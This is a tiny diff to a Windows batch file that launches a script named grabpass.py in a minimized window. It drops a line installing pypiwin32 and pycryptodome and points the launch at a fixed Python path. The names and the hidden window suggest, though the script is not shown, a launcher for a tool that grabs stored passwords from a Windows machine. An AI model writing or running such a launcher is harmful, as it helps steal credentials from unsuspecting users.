@@ -1,5 +1,4 @@
 @echo off
-pip install pypiwin32 pycryptodome 
 
-start /min python grabpass.py
+start /min C:\Python\python grabpass.py
  
